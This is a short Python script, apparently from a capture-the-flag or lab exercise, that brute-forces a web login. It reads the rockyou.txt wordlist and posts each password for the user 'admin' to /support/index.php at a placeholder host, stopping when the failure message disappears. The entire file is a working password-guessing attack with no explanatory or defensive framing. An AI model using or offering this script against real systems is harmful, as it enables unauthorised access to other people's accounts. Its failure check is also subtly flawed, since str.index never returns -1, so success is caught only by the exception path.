#!/usr/bin/env python

import requests 

file = open("rockyou.txt","r",errors="ignore").read().split("\n")
for password in file:
	r = requests.post("http://<IP>:<PORT>/support/index.php",data={
		"username":"admin",
		"password":password
		})
	try:
		if r.text.index('Incorrect username or password.')==-1 :
			print(r.text)
			print(password)
			exit(1)
		else:
			print("FAILED "+password)
	except:
		print(password)
		exit(1)
print('end')
